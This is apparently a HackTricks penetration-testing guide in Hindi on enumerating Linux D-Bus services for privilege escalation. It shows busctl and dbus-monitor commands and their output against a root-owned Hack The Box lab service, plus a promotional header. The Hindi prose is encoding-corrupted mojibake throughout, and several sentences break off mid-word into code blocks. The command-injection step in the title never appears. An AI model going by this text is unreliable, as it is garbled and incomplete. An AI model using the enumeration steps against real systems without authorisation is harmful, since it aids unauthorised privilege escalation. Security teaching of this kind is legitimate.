# D-Bus ‡§è‡§®‡•Å‡§Æ‡§∞‡•á‡§∂‡§® ‡§î‡§∞ ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§á‡§Ç‡§ú‡•á‡§ï‡•ç‡§∂‡§® ‡§™‡•ç‡§∞‡§ø‡§µ‡§ø‡§≤‡•á‡§ú ‡§è‡§∏‡•ç‡§ï‡•á‡§≤‡•á‡§∂‡§®

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä **‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏ ‡§¶‡•á‡§ñ‡•á‡§Ç**](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS ‡§î‡§∞ HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§ï‡§≤‡•á‡§ï‡•ç‡§∂‡§®, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** ‡§™‡§∞ ‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, HackTricks** ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§Æ‡•á‡§Ç PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á‡•§

</details>

## **GUI ‡§è‡§®‡•Å‡§Æ‡§∞‡•á‡§∂‡§®**

D-Bus ‡§ï‡•ã Ubuntu ‡§°‡•á‡§∏‡•ç‡§ï‡§ü‡•â‡§™ ‡§µ‡§æ‡§§‡§æ‡§µ‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ü‡§∞-‡§™‡•ç‡§∞‡•ã‡§∏‡•á‡§∏ ‡§∏‡§Ç‡§ö‡§æ‡§∞ (IPC) ‡§Æ‡•Ä‡§°‡§ø‡§è‡§ü‡§∞ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§ Ubuntu ‡§™‡§∞, ‡§ï‡§à ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§¨‡§∏‡•ã‡§Ç ‡§ï‡§æ ‡§∏‡§Æ‡§ï‡§æ‡§≤‡§ø‡§ï ‡§ë‡§™‡§∞‡•á‡§∂‡§® ‡§¶‡•á‡§ñ‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à: ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¨‡§∏, ‡§ú‡•ã **‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•Ä ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡•á‡§µ‡§æ‡§è‡§Ç ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§æ‡§•‡§Æ‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à**, ‡§î‡§∞ ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§≤‡•â‡§ó-‡§á‡§® ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§∏‡§§‡•ç‡§∞ ‡§¨‡§∏, ‡§ú‡•ã ‡§ï‡•á‡§µ‡§≤ ‡§â‡§∏ ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§∏‡•á‡§µ‡§æ‡§è‡§Ç ‡§â‡§ú‡§æ‡§ó‡§∞ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π‡§æ‡§Å ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¨‡§∏ ‡§™‡§∞ ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§ï‡•á‡§Ç‡§¶‡•ç‡§∞‡§ø‡§§ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§á‡§∏‡§ï‡§æ ‡§∏‡§Ç‡§¨‡§Ç‡§ß ‡§â‡§ö‡•ç‡§ö ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç (‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§∞‡•Ç‡§ü) ‡§™‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§∏‡•á ‡§π‡•à ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§â‡§¶‡•ç‡§¶‡•á‡§∂‡•ç‡§Ø ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§â‡§ö‡•ç‡§ö ‡§ï‡§∞‡§®‡§æ ‡§π‡•à‡•§ ‡§Ø‡§π ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ï‡§ø D-Bus ‡§ï‡•Ä ‡§µ‡§æ‡§∏‡•ç‡§§‡•Å‡§ï‡§≤‡§æ ‡§è‡§ï '‡§∞‡§æ‡§â‡§ü‡§∞' ‡§™‡•ç‡§∞‡§§‡§ø ‡§∏‡§§‡•ç‡§∞ ‡§¨‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à, ‡§ú‡•ã ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§∏‡§Ç‡§¶‡•á‡§∂‡•ã‡§Ç ‡§ï‡•ã ‡§∏‡§π‡•Ä ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡•Å‡§®‡§∞‡•ç‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡§ø‡§Æ‡•ç‡§Æ‡•á‡§¶‡§æ‡§∞ ‡§π‡•à ‡§ú‡•ã ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Ç‡§µ‡§æ‡§¶ ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§â‡§®‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§∞‡•ç‡§¶‡§ø‡§∑‡•ç‡§ü ‡§™‡§§‡•á ‡§ï‡•á ‡§Ü‡§ß‡§æ‡§∞ ‡§™‡§∞‡•§

D-Bus ‡§™‡§∞ ‡§∏‡•á‡§µ‡§æ‡§è‡§Ç **‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü‡•ç‡§∏** ‡§î‡§∞ **‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏‡•á‡§∏** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§ø‡§§ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à‡§Ç‡•§ ‡§ë‡§¨‡•ç‡§ú
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


‡§™‡§π‡§≤‡•Ä ‡§õ‡§µ‡§ø ‡§Æ‡•á‡§Ç D-Bus ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¨‡§∏ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§∏‡•á‡§µ‡§æ‡§è‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§ó‡§à ‡§π‡•à‡§Ç, **org.debin.apt** ‡§ï‡•ã ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ö‡•Å‡§®‡§ï‡§∞ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§¨‡§∏ ‡§¨‡§ü‡§® ‡§ï‡•ã ‡§ö‡•Å‡§®‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶‡•§ D-Feet ‡§á‡§∏ ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ö‡•Å‡§®‡•á ‡§ó‡§è ‡§ë‡§¨‡•ç‡§ú
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv‚Ä¶ -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§®‡•ç‡§∏

[‡§µ‡§ø‡§ï‡§ø‡§™‡•Ä‡§°‡§ø‡§Ø‡§æ ‡§∏‡•á:](https://en.wikipedia.org/wiki/D-Bus) ‡§ú‡§¨ ‡§ï‡•ã‡§à ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§è‡§ï ‡§¨‡§∏ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§∏‡•á‡§ü ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à, ‡§§‡•ã ‡§¨‡§∏ ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§¨‡§∏ ‡§®‡§æ‡§Æ ‡§ú‡•ã _‡§Ö‡§¶‡•ç‡§µ‡§ø‡§§‡•Ä‡§Ø ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§®‡§æ‡§Æ_ ‡§ï‡§π‡§≤‡§æ‡§§‡§æ ‡§π‡•à ‡§®‡§ø‡§∞‡•ç‡§ß‡§æ‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•á ‡§¨‡§∏ ‡§®‡§æ‡§Æ ‡§Ö‡§™‡§∞‡§ø‡§µ‡§∞‡•ç‡§§‡§®‡•Ä‡§Ø ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‚Äî‡§Ø‡§π ‡§ó‡§æ‡§∞‡§Ç‡§ü‡•Ä ‡§π‡•à ‡§ï‡§ø ‡§ú‡§¨ ‡§§‡§ï ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à, ‡§§‡§¨ ‡§§‡§ï ‡§Ø‡•á ‡§®‡§π‡•Ä‡§Ç ‡§¨‡§¶‡§≤‡•á‡§Ç‡§ó‡•á‚Äî‡§î‡§∞, ‡§î‡§∞ ‡§≠‡•Ä ‡§Æ‡§π‡§§‡•ç‡§µ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§π‡•à, ‡§á‡§®‡•ç‡§π‡•á‡§Ç ‡§¨‡§∏ ‡§ï‡•á ‡§ú‡•Ä‡§µ‡§®‡§ï‡§æ‡§≤ ‡§Æ‡•á‡§Ç ‡§™‡•Å‡§®‡§É ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ‡•§ ‡§á‡§∏‡§ï‡§æ ‡§Æ‡§§‡§≤‡§¨ ‡§π‡•à ‡§ï‡§ø ‡§â‡§∏ ‡§¨‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•ã‡§à ‡§≠‡•Ä ‡§Ö‡§®‡•ç‡§Ø ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§ï‡§≠‡•Ä ‡§≠‡•Ä ‡§ê‡§∏‡§æ ‡§Ö‡§¶‡•ç‡§µ‡§ø‡§§‡•Ä‡§Ø ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§®‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§ó‡§æ, ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§µ‡§π‡•Ä ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§â‡§∏ ‡§¨‡§∏ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§¨‡§Ç‡§¶ ‡§ï‡§∞ ‡§¶‡•á‡§§‡•Ä ‡§π‡•à ‡§î‡§∞ ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§¨‡§®‡§æ‡§§‡•Ä ‡§π‡•à‡•§ ‡§Ö‡§¶‡•ç‡§µ‡§ø‡§§‡•Ä‡§Ø ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§® ‡§®‡§æ‡§Æ ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á ‡§™‡§π‡§ö‡§æ‡§®‡•á ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§µ‡•á‚Äî‡§Ö‡§®‡•ç‡§Ø‡§•‡§æ ‡§®‡§ø‡§∑‡§ø‡§¶‡•ç‡§ß‚Äî‡§Ö‡§ï‡•ç‡§∑‡§∞ ‡§ï‡•ã‡§≤‡§® ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§

### ‡§∏‡•á‡§µ‡§æ ‡§ë‡§¨‡•ç‡§ú
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### ‡§∏‡•á‡§µ‡§æ ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡•á ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§ï‡•Ä ‡§∏‡•Ç‡§ö‡•Ä ‡§¨‡§®‡§æ‡§è‡§Ç

‡§Ü‡§™‡§ï‡•ã ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡§æ‡§Å ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è‡•§
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

‚îî‚îÄ/htb
‚îî‚îÄ/htb/oouch
‚îî‚îÄ/htb/oouch/Block
```
### ‡§∏‡•á‡§µ‡§æ ‡§ë‡§¨‡•ç‡§ú‡•á‡§ï‡•ç‡§ü ‡§ï‡§æ ‡§á‡§Ç‡§ü‡•ç‡§∞‡•ã‡§∏‡•ç‡§™‡•á‡§ï‡•ç‡§ü ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç `tree` ‡§™‡•à‡§∞‡§æ‡§Æ‡•Ä‡§ü‡§∞ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§®‡§µ‡•Ä‡§®‡§§‡§Æ ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ ‡§ï‡§æ ‡§ö‡§Ø‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ (_‡§™‡§ø‡§õ‡§≤‡•á ‡§ñ‡§Ç‡§° ‡§¶‡•á‡§ñ‡•á‡§Ç_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### ‡§Æ‡•â‡§®‡§ø‡§ü‡§∞/‡§ï‡•à‡§™‡•ç‡§ö‡§∞ ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏

‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• (‡§ï‡•á‡§µ‡§≤ `send_destination` ‡§î‡§∞ `receive_sender` ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡§∞‡•ç‡§Ø‡§æ‡§™‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡§Ç) ‡§Ü‡§™ **‡§è‡§ï ‡§°‡•Ä-‡§¨‡§∏ ‡§∏‡§Ç‡§ö‡§æ‡§∞ ‡§ï‡•ã ‡§Æ‡•â‡§®‡§ø‡§ü‡§∞** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§∏‡§Ç‡§ö‡§æ‡§∞** ‡§ï‡•ã **‡§Æ‡•â‡§®‡§ø‡§ü‡§∞** ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™‡§ï‡•ã **‡§∞‡•Ç‡§ü** ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§ ‡§Ö‡§ó‡§∞ ‡§´‡§ø‡§∞ ‡§≠‡•Ä ‡§∞‡•Ç‡§ü ‡§π‡•ã‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ ‡§π‡•ã ‡§§‡•ã [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ‡§î‡§∞ [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) ‡§¶‡•á‡§ñ‡•á‡§Ç‡•§

{% hint style="warning" %}
‡§Ö‡§ó‡§∞ ‡§Ü‡§™ ‡§ú‡§æ‡§®‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§è‡§ï ‡§°‡•Ä-‡§¨‡§∏ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•ã ‡§ï‡•à‡§∏‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡•á‡§Ç ‡§§‡§æ‡§ï‡§ø **‡§ó‡•à‡§∞ ‡§∞‡•Ç‡§ü ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡•ç‡§®‡§ø‡§´‡§º ‡§ï‡§∞‡§®‡•á** ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã, ‡§§‡•ã ‡§ï‡•É‡§™‡§Ø‡§æ **‡§Æ‡•Å‡§ù‡§∏‡•á ‡§∏‡§Ç‡§™‡§∞‡•ç‡§ï ‡§ï‡§∞‡•á‡§Ç**!
{% endhint %}

‡§Æ‡•â‡§®‡§ø‡§ü‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§§‡§∞‡•Ä‡§ï‡•á:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
**‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç ‡§á‡§Ç‡§ü‡§∞‡§´‡•á‡§∏ `htb.oouch.Block` ‡§ï‡•ã ‡§Æ‡•â‡§®‡§ø‡§ü‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§∏‡§Ç‡§¶‡•á‡§∂ "**_**lalalalal**_**" ‡§ó‡§≤‡§§ ‡§∏‡§Ç‡§ö‡§æ‡§∞ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‚Ä£ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

